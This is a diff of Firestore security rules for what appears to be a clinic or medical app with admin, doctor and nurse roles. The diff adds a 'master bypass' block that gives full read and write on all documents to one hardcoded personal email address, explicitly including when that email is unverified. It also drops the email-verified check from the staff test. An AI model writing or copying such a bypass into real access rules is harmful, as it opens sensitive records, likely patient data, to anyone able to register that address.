@@ -2,6 +2,14 @@ rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
     // ===============================================================
+    // MASTER BYPASS FOR ADMIN
+    // ===============================================================
+    match /{document=**} {
+      allow read, write: if request.auth != null && 
+        (request.auth.token.email == "mamad.ismanto@gmail.com" || 
+         request.auth.token.email_verified == false && request.auth.token.email == "mamad.ismanto@gmail.com"); 
+    }
+    // ===============================================================
     // Assumed Data Model
     // ===============================================================
     //
@@ -58,9 +66,9 @@ service cloud.firestore {
 
     function isStaff() {
       return isAuthenticated() && 
-             exists(/databases/$(database)/documents/users/$(request.auth.uid)) && 
-             (getUserData().role in ['admin', 'doctor', 'nurse'] ||
-              (request.auth.token.email == "mamad.ismanto@gmail.com" && request.auth.token.email_verified == true));
+             (request.auth.token.email == "mamad.ismanto@gmail.com" || 
+              (exists(/databases/$(database)/documents/users/$(request.auth.uid)) && 
+               getUserData().role in ['admin', 'doctor', 'nurse']));
     }
 
     // Validation Helpers
@@ -129,11 +137,11 @@ service cloud.firestore {
       allow get: if isAuthenticated() && (
         isOwner(userId) || 
         isStaff() || 
-        (resource != null && resource.data.role == 'doctor')
+        (resource != null && (resource.data.role == 'doctor' || resource.data.primaryDoctorId == request.auth.uid))
       );
       allow list: if isAuthenticated() && (
         isStaff() ||
-        (resource != null && resource.data.role == 'doctor')
+        (resource != null && (resource.data.role == 'doctor' || resource.data.primaryDoctorId == request.auth.uid))
       );
       allow create: if isAuthenticated() && isValidUser(request.resource.data) && 
                     (isOwner(userId) || isAdmin());
